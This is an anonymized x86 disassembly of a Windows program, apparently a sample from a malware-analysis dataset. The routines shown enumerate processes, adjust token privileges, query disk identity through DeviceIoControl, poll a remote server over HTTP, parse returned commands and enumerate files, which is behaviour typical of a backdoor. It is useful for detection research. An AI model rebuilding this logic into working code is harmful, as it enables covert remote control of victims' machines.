xor [ eax ] dl
inc ecx
inc eax
dec edi
jne r-xdata
mov ecx esi
sub_4026a9
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
call strlen
xor edi edi
pop ecx
test eax eax
mov [ ebp - 0x4 ] eax
jle r-xdata
push esi
call strlen
pop ecx
push ebx
and [ eax + esi + 0x1 ] 0x0
pop edi
pop esi
leave
retn
test eax eax
jg r-xdata
mov al [ ecx ]
not al
and dl al
or dl [ ecx ]
jmp r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
test [ ecx - 0x1 ] bl
je r-xdata
mov [ edi + esi ] dl
inc edi
cmp edi [ ebp - 0x4 ]
jl r-xdata
inc ecx
inc ecx
dec [ ebp + 0x8 ]
jne r-xdata
mov bl [ edi + esi ]
xor dl dl
lea ecx [ ebp - 0x13 ]
mov [ ebp + 0x8 ] 0x8
pop ebx
sub_40274f
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4026a9
push esi
call strlen
pop ecx
pop ecx
and [ eax + esi + 0x1 ] 0x0
xor eax eax
pop esi
retn
test eax eax
jg r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
sub_402776
push ebp
mov ebp esp
mov eax 0x1214
call sub_418fe0
push ebx
push esi
push edi
push 0xf
pop ecx
mov esi rw-data
lea edi [ ebp - 0x110 ]
push 0x31
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0xd2 ]
push 0x104
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x110 ]
push eax
call [ DoEnvironmentSubstA@IAT ]
lea eax [ ebp - 0x110 ]
push eax
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x1214 ]
push 0x1000
push eax
call EnumProcesses
test eax eax
je r-xdata
push rw-data
push [ ebp + 0x8 ]
call strcmp
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
jmp r-xdata
xor eax eax
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
shr edi 0x2
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea ebx [ ebp - 0x1214 ]
inc [ ebp - 0x4 ]
add ebx 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push 0x4
push eax
push esi
call EnumProcessModules
test eax eax
je r-xdata
push [ ebx ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x214 ]
push 0x104
push eax
push [ ebp - 0xc ]
push esi
call GetModuleBaseNameA
push [ ebp + 0x8 ]
call strlen
push eax
lea eax [ ebp - 0x214 ]
push [ ebp + 0x8 ]
push eax
call _strnicmp
add esp 0x10
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_402890
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x10
pop esi
lea eax [ ebp - 0xc ]
push eax
xor ebx ebx
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push ebx
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2c ]
push esi
mov esi [ AdjustTokenPrivileges@IAT ]
push eax
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ebx
call esi
mov edi [ GetLastError@IAT ]
call edi
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x14 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x10 ] 0xfffffffd
or [ ebp - 0x10 ] 0x2
jmp r-xdata
push ebx
push ebx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp + 0x8 ]
call esi
call edi
neg eax
sbb eax eax
inc eax
sub_40292f
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push edi
push 0x5
pop ecx
mov esi rw-data
lea edi [ ebp - 0x44 ]
lea eax [ ebp - 0x44 ]
[ edi ] [ esi ]
xor ebx ebx
push eax
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] 0x2
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] bl
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x1b ] bl
mov [ ebp - 0x1a ] 0xec
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x17 ] bl
mov [ ebp - 0x16 ] bl
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x13 ] bl
mov [ ebp - 0x12 ] bl
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x10 ] bl
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] bl
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] bl
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] bl
movsw [ edi ] [ esi ]
call sub_40274f
lea eax [ ebp - 0x44 ]
push eax
call sub_402776
pop ecx
cmp eax 0x1
pop ecx
jne r-xdata
mov [ ebp - 0x4 ] ebx
xor eax eax
jmp r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xa
jl r-xdata
lea eax [ ebp - 0x2c ]
push ebx
push eax
lea eax [ ebp - 0x254 ]
push 0x210
push eax
lea eax [ ebp - 0x24 ]
push 0x20
push eax
push 0x7c088
push esi
call [ DeviceIoControl@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push 0x3
push ebx
push 0x3
push 0xc0000000
push rw-data
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
mov [ ebp - 0x28 ] esi
je r-xdata
jmp r-xdata
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x230 ]
sub edi esi
mov [ ebp - 0x4 ] ebx
mov ecx esi
mov [ ebp + 0x8 ] edi
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax ebx
mov al [ edi + ecx ]
cmp al 0x20
jb r-xdata
mov [ ecx ] 0x2e
cmp al 0x7e
ja r-xdata
inc [ ebp - 0x4 ]
inc ecx
cmp [ ebp - 0x4 ] 0x4a
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ecx ]
mov al [ eax + esi - 0x1 ]
mov [ ecx - 0x1 ] dl
mov [ ecx ] al
mov [ ecx ] al
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
xor edi edi
call strlen
test eax eax
pop ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
push 0x2
cdq
pop edi
idiv edi
cmp edx 0x1
jne r-xdata
push esi
mov [ esi + 0x4a ] bl
call strlen
pop ecx
cmp [ edi + esi ] 0x20
jne r-xdata
push esi
mov [ eax + esi + 0x1 ] bl
call strlen
test eax eax
pop ecx
jbe r-xdata
cmp eax ebx
jg r-xdata
cmp edi ebx
jle r-xdata
push esi
inc edi
call strlen
cmp edi eax
pop ecx
jb r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
push 0x1
pop ebx
mov al [ ebx + esi ]
cmp al 0x61
jl r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
push esi
call strlen
cmp edi eax
pop ecx
jae r-xdata
push esi
inc ebx
call strlen
cmp ebx eax
pop ecx
jb r-xdata
cmp al 0x7a
jg r-xdata
mov [ ebp + 0x8 ] esi
sub al 0x20
mov [ ebx + esi ] al
mov ecx [ ebp + 0x8 ]
mov al [ edi + esi ]
inc edi
inc [ ebp + 0x8 ]
push esi
mov [ ecx ] al
call strlen
cmp edi eax
pop ecx
jb r-xdata
sub_402b19
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x4
pop eax
xor ebx ebx
push ebx
push ebx
push ebx
push eax
push rw-data
mov [ ebp - 0x10 ] eax
mov [ rw-data ] 0x194
call [ InternetOpenA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x4 ] esi
je r-xdata
push rw-data
call _strdup
pop ecx
push ebx
push ebx
push 0x3
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call [ InternetConnectA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp + 0x18 ]
dec eax
je r-xdata
push esi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push edi
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
dec eax
jne r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ ebp - 0xc ]
cmp eax 0x197
je r-xdata
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push edi
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
call esi
push [ ebp - 0x4 ]
call esi
jmp r-xdata
push 0x3e8
call _sleep
cmp esi ebx
pop ecx
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
pop ecx
mov edi eax
xor esi esi
push [ ebp + 0xc ]
call strlen
pop ecx
push eax
push [ ebp + 0xc ]
push ebx
push ebx
push [ ebp + 0x8 ]
jmp r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
call [ HttpSendRequestA@IAT ]
push ebx
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x4 ]
call esi
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
push [ ebp + 0x8 ]
mov esi [ InternetCloseHandle@IAT ]
mov [ rw-data ] ebx
call esi
push [ ebp + 0x14 ]
push edi
call free
pop ecx
push [ ebp + 0x8 ]
mov [ esi + edi ] bl
mov [ rw-data ] esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push [ ebp + 0x14 ]
call esi
push [ ebp - 0x4 ]
call esi
mov eax edi
jmp r-xdata
add esi [ ebp - 0x8 ]
lea eax [ esi + 0x400 ]
push eax
push edi
call realloc
pop ecx
mov edi eax
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ esi + edi ]
push 0x3ff
push eax
push [ ebp + 0x8 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_402cf7
push ebp
mov ebp esp
sub esp 0x4c8
push ebx
push esi
push edi
push 0x2b
pop ecx
mov esi rw-data
push [ ebp + 0x8 ]
lea edi [ ebp - 0xc4 ]
[ edi ] [ esi ]
xor esi esi
xor ebx ebx
call strlen
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc4 ]
push eax
call strlen
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] esi
call strlen
mov edi eax
lea eax [ ebp - 0xc4 ]
push eax
call strlen
lea eax [ edi + eax + 0x1 ]
push eax
call malloc
mov edi eax
add esp 0x14
cmp edi esi
jne r-xdata
lea eax [ ebp - 0xc4 ]
push eax
push [ ebp + 0x8 ]
push rw-data
push edi
call sprintf
xor eax eax
add esp 0x10
cmp [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
jle r-xdata
push 0x1
call exit
mov eax ebx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov al [ eax + ecx ]
cmp al 0x3b
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp + esi - 0x4c8 ] 0x0
mov [ ebp - 0xc ] 0x1
test esi esi
je r-xdata
mov [ ebp + esi - 0x4c8 ] al
inc esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jl r-xdata
lea eax [ ebp - 0x4c8 ]
xor esi esi
push eax
call sub_402eb0
mov ebx eax
pop ecx
test ebx ebx
mov [ ebp - 0x14 ] ebx
je r-xdata
test esi esi
jle r-xdata
push edi
call strlen
mov edx eax
push ebx
mov [ ebp - 0x18 ] edx
call strlen
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
add ecx edx
lea eax [ eax + ecx + 0x1 ]
push eax
push edi
call realloc
mov edi eax
lea eax [ ebp - 0xc4 ]
push eax
push ebx
push edi
push rw-data
push edi
call sprintf
push ebx
call free
add esp 0x28
cmp [ ebp - 0xc ] 0x0
jne r-xdata
and [ ebp + esi - 0x4c8 ] 0x0
lea eax [ ebp - 0x4c8 ]
push eax
call sub_402eb0
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
push ebx
call strlen
pop ecx
mov [ rw-data ] eax
test edi edi
je r-xdata
push edi
call strlen
push ebx
mov esi eax
call strlen
lea eax [ esi + eax + 0x1 ]
push eax
push edi
call realloc
add esp 0x10
mov edi eax
test edi edi
push ebx
jne r-xdata
mov eax edi
push edi
call strlen
pop ecx
mov [ rw-data ] eax
push edi
push rw-data
push edi
push 0x0
push rw-data
push 0x0
jmp r-xdata
call sprintf
add esp 0x10
push ebx
call free
pop ecx
sub_402eb0
push ebp
mov ebp esp
push ecx
inc [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x9
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al 0x20
je r-xdata
cmp al 0xa
jne r-xdata
push ebx
push esi
push edi
xor ebx ebx
push [ ebp + 0x8 ]
xor esi esi
call strlen
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_40874c
pop ecx
mov esi eax
mov eax rw-data
mov edi eax
mov esi eax
mov esi ebx
shl esi 0x3
push [ esi + rw-data ]
call strlen
add eax [ ebp + 0x8 ]
push eax
call [ esi + rw-data ]
pop ecx
mov esi eax
pop ecx
mov [ ebp - 0x4 ] 0x1
add esi 0x8
inc ebx
mov edi esi
cmp [ esi ] 0x0
jne r-xdata
push [ edi ]
call strlen
push eax
push [ ebp + 0x8 ]
push [ edi ]
call strncmp
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
sub_402f52
push ebp
mov ebp esp
sub esp 0x410
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x7
push rw-data
push esi
mov [ ebp - 0x10 ] 0x50
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push esi
call _strdup
pop ecx
mov edi eax
push ebx
xor ebx ebx
cmp [ edi ] bl
mov esi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] ebx
je r-xdata
add esi 0x7
mov esi [ GetTickCount@IAT ]
call esi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] ebx
cmp [ esi ] 0x2f
jne r-xdata
push [ ebp + 0x8 ]
push [ rw-data ]
push [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sprintf
add esp 0x18
cmp edi ebx
pop ebx
je r-xdata
push 0x1
push [ ebp - 0x10 ]
push edi
push ebx
push [ ebp - 0x8 ]
call sub_402b19
add esp 0x14
cmp eax ebx
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x410 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
push edi
call free
pop ecx
push [ rw-data ]
call _sleep
inc [ ebp - 0x4 ]
pop ecx
jmp r-xdata
push eax
call free
pop ecx
inc esi
cmp [ esi ] bl
jne r-xdata
cmp [ esi + 0x1 ] bl
lea eax [ esi + 0x1 ]
mov [ esi ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
lea eax [ esi + 0x1 ]
mov [ esi ] bl
je r-xdata
call esi
mov ecx [ rw-data ]
sub eax [ ebp - 0xc ]
imul ecx ecx 0x3e8
cmp eax ecx
jae r-xdata
push eax
call atoi
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x8 ] eax
sub_403071
push ebp
mov ebp esp
sub esp 0x100
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
push [ rw-data ]
push rw-data
push eax
call atoi
cmp eax 0xa
pop ecx
jge r-xdata
push eax
mov [ rw-data ] eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x100 ]
push esi
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_4030eb
push ebp
mov ebp esp
sub esp 0x100
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
push [ rw-data ]
push rw-data
push eax
call atoi
cmp eax 0x1
pop ecx
jge r-xdata
push eax
mov [ rw-data ] eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x100 ]
push esi
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_403165
push ebp
mov ebp esp
sub esp 0xaac
push ebx
push esi
push edi
lea eax [ ebp - 0xaac ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0xaac ]
push rw-data
push eax
call fopen
mov edi eax
add esp 0x18
test edi edi
je r-xdata
and [ ebp - 0x9a8 ] 0x0
mov esi [ ebp + 0x10 ]
mov eax 0x800
cmp esi eax
jl r-xdata
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1a4 ]
push rw-data
push eax
call sprintf
add esp 0x20
lea eax [ ebp - 0x9a8 ]
push 0x3
push eax
lea eax [ ebp - 0x1a4 ]
push eax
call strncpy
and [ ebp - 0x1a1 ] 0x0
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
call [ GetDriveTypeA@IAT ]
push 0x2
pop ebx
cmp eax ebx
je r-xdata
push edi
push esi
lea eax [ ebp - 0x9a8 ]
push 0x1
push eax
call fread
push edi
call fclose
mov eax esi
add esp 0x14
cdq
sub eax edx
lea ecx [ esi - 0x1 ]
sar eax 0x1
mov esi eax
lea eax [ ebp - 0x9a8 ]
push eax
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
cmp eax 0x3
je r-xdata
cmp [ ebp + eax - 0x9a8 ] 0x3a
jne r-xdata
lea eax [ ebp - 0x9a8 ]
push eax
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x9a8 ]
push rw-data
push eax
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
cmp eax 0x4
je r-xdata
inc eax
jmp r-xdata
cmp [ ebp + eax - 0x9a7 ] 0x5c
je r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sprintf
add esp 0x24
jmp r-xdata
lea eax [ ebp - 0x9a8 ]
push eax
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
push rw-data
push eax
call fclose
mov eax [ ebp + 0x24 ]
pop ecx
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x9a8 ]
push eax
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
push rw-data
jmp r-xdata
cmp eax ecx
jge r-xdata
cmp eax ecx
jge r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_405240
pop ecx
push 0x1
pop eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x9a8 ]
push eax
call _stat
lea eax [ ebp - 0x9a8 ]
push eax
call sub_408003
mov esi eax
push 0x7
push rw-data
push esi
call strncmp
add esp 0x18
test eax eax
jne r-xdata
mov esi rw-data
push esi
push eax
call strtok
pop ecx
mov [ ebp - 0x18 ] eax
pop ecx
lea edi [ ebp - 0x14 ]
lea ecx [ eax - 0x1 ]
xor edi edi
cmp ecx esi
jge r-xdata
push 0x4
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x9a8 ]
push eax
push [ ebp - 0x28 ]
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
push rw-data
push esi
push 0x0
call strtok
mov [ edi ] eax
pop ecx
add edi 0x4
dec ebx
pop ecx
jne r-xdata
xor esi esi
and [ ebp + edi - 0x9a8 ] 0x0
jmp r-xdata
push 0x1
pop edx
sub edx eax
push 0x6
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x9a8 ]
push eax
push [ ebp - 0x28 ]
movzx eax [ ebp + 0x1e ]
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x1a ]
push eax
movzx eax [ ebp + 0x16 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
push rw-data
jmp r-xdata
push esi
call free
pop ecx
jmp r-xdata
and [ ebp + esi - 0xc ] 0x0
push eax
call atoi
pop ecx
mov [ ebp + esi - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x9a8 ] 0x0
je r-xdata
lea ebx [ edx + ecx ]
inc edi
inc ecx
cmp ecx esi
mov [ ebp + ebx - 0x9a8 ] al
jl r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sprintf
add esp 0x28
mov eax [ ebp + esi - 0x18 ]
test eax eax
je r-xdata
movzx eax [ ebp + 0x14 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
add esi 0x4
cmp esi 0xc
jl r-xdata
mov al [ ebp + ecx - 0x9a8 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
push esi
call free
pop ecx
lea ecx [ ebp - 0x9a8 ]
push ecx
movzx ecx [ ebp + 0x1e ]
push [ ebp + 0xc ]
push ecx
movzx ecx [ ebp + 0x1c ]
push ecx
movzx ecx [ ebp + 0x1a ]
push ecx
movzx ecx [ ebp + 0x16 ]
push ecx
push eax
push rw-data
jmp r-xdata
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
movzx ecx [ ebp + 0x16 ]
cmp ecx [ ebp - 0x8 ]
jl r-xdata
jne r-xdata
movzx ecx [ ebp + 0x1a ]
cmp ecx [ ebp - 0x4 ]
jl r-xdata
sub_403510
push ebp
mov ebp esp
sub esp 0x5d0
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x3c8 ]
push 0x3d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x3ba ]
push 0x104
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x3c8 ]
push eax
call [ DoEnvironmentSubstA@IAT ]
cmp [ rw-data ] 0x6
lea eax [ ebp - 0x3c8 ]
push eax
jb r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ rw-data ]
call strlen
mov [ rw-data ] eax
mov eax [ rw-data ]
pop ecx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x5d0 ]
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
mov ebx [ FileTimeToLocalFileTime@IAT ]
add esp 0x14
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x148 ]
push eax
jmp r-xdata
lea eax [ ebp - 0x4cc ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x4cc ]
push eax
lea eax [ ebp - 0x5d0 ]
push rw-data
push eax
call sprintf
mov esi 0x80
push esi
call malloc
push esi
push 0x0
push eax
mov [ rw-data ] eax
call memset
add esp 0x1c
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x5d0 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
call ebx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xc ]
push eax
call [ FileTimeToSystemTime@IAT ]
test [ ebp - 0x15c ] 0x10
jne r-xdata
lea eax [ ebp - 0x15c ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea esi [ ebp - 0x1c ]
lea eax [ ebp - 0x130 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
push [ ebp - 0x13c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
lea eax [ ebp - 0x4cc ]
push eax
movsd [ edi ] [ esi ]
call sub_403165
add esp 0x20
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x148 ]
push eax
lea eax [ ebp - 0x130 ]
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
add esp 0xc
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2c4 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
jmp r-xdata
push eax
call free
pop ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40370b
push ebp
mov ebp esp
sub esp 0x16c
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40c987
mov esi 0x80
mov [ ebp + 0x8 ] eax
push esi
call malloc
xor ebx ebx
push esi
push ebx
push eax
mov [ rw-data ] eax
call memset
push [ ebp + 0x8 ]
mov esi rw-data
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
push esi
call strcpy
push [ ebp + 0x8 ]
lea eax [ ebp - 0x16c ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x16c ]
push eax
call sub_405240
add esp 0x2c
inc [ rw-data ]
cmp [ rw-data ] ebx
jle r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
jne r-xdata
push esi
call sub_4037fd
cmp eax 0x1
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
push rw-data
jmp r-xdata
push eax
call _sleep
inc ebx
add esi 0x208
cmp ebx [ rw-data ]
pop ecx
jl r-xdata
push rw-data
push rw-data
